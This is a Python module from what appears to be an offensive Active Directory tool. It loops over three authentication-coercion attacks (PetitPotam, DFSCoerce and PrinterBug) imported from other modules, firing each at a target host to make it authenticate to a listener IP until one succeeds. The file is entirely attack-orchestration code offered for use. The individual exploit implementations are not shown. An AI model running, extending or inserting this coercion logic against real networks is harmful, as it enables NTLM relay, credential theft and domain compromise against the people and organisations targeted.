from __future__ import annotations
from util.log import get_logger
from . import petitpotam, dfscoerce, printerbug  # <-- Add printerbug here

log = get_logger(__name__)

VECTORS = [
    ("PetitPotam (Unauth)", petitpotam.trigger),
    ("DFSCoerce", dfscoerce.trigger),
    ("PrinterBug", printerbug.trigger),       # <-- Add it to the list
]

def trigger_any(target: str, listener_ip: str, username: str = "", password: str = "", domain: str = "") -> bool:
    for name, trigger_func in VECTORS:
        log.info(f"Attempting coercion via {name}...")
        try:
            if trigger_func(target, listener_ip, username, password, domain):
                log.info(f"Coercion trigger via {name} was sent successfully.")
                return True
            else:
                log.warning(f"{name} trigger failed.")
        except Exception as e:
            log.error(f"{name} raised an exception: {e}")
            
    log.error("All coercion vectors failed.")
    return False
